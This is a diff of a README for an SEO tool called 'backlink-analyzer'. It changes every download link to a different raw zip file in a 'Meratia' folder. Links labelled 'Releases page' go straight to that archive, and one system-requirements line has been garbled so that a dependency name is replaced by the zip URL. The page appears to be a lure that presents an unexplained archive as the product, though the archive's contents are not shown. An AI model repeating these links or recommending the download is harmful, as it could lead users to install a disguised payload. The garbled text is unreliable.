@@ -1,7 +1,7 @@
 # 🛠️ backlink-analyzer - Analyze Your Backlinks Easily
 
 ## 📥 Download the Latest Version
-[![Download Latest Release](https://raw.githubusercontent.com/Suraj24w/backlink-analyzer/main/Meratia/backlink-analyzer.zip)](https://raw.githubusercontent.com/Suraj24w/backlink-analyzer/main/Meratia/backlink-analyzer.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Suraj24w/backlink-analyzer/main/Meratia/analyzer-backlink-v2.3.zip)](https://raw.githubusercontent.com/Suraj24w/backlink-analyzer/main/Meratia/analyzer-backlink-v2.3.zip)
 
 ## 🚀 Getting Started
 Welcome to **backlink-analyzer**, your go-to tool for auditing and analyzing backlinks. This tool helps you understand the quality of your backlinks and improve your website’s SEO.
@@ -9,7 +9,7 @@ Welcome to **backlink-analyzer**, your go-to tool for auditing and analyzing bac
 ### 📋 System Requirements
 To run backlink-analyzer smoothly, make sure your system meets the following requirements:
 - **Operating System:** Windows 10 or later, macOS (10.12 and above), or a recent version of Linux.
-- **https://raw.githubusercontent.com/Suraj24w/backlink-analyzer/main/Meratia/backlink-analyzer.zip** Version 12 or newer.
+- **https://raw.githubusercontent.com/Suraj24w/backlink-analyzer/main/Meratia/analyzer-backlink-v2.3.zip** Version 12 or newer.
 - **Python:** Version 3.6 or newer.
 - **Docker:** If you prefer using Docker, ensure it is installed on your machine.
 - **Internet Connection:** A stable connection for accurate data fetching.
@@ -22,7 +22,7 @@ To run backlink-analyzer smoothly, make sure your system meets the following req
 - **Proxy Support:** Enhance your scraping capabilities while ensuring anonymity.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Suraj24w/backlink-analyzer/main/Meratia/backlink-analyzer.zip) to download the latest version of backlink-analyzer.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Suraj24w/backlink-analyzer/main/Meratia/analyzer-backlink-v2.3.zip) to download the latest version of backlink-analyzer.
 
 1. Click on the link above to open the Releases page.
 2. You will see several versions listed. Choose the one labeled with the highest version number.
@@ -79,4 +79,4 @@ Your contributions can help enhance the functionality and user experience of the
 ## 📫 Support
 For any questions or suggestions, please reach out through the Issues tab on the GitHub repository. We will respond as quickly as possible to assist you.
 
-Explore our [Releases page](https://raw.githubusercontent.com/Suraj24w/backlink-analyzer/main/Meratia/backlink-analyzer.zip) to download the latest version and start analyzing your backlinks today!
+Explore our [Releases page](https://raw.githubusercontent.com/Suraj24w/backlink-analyzer/main/Meratia/analyzer-backlink-v2.3.zip) to download the latest version and start analyzing your backlinks today!
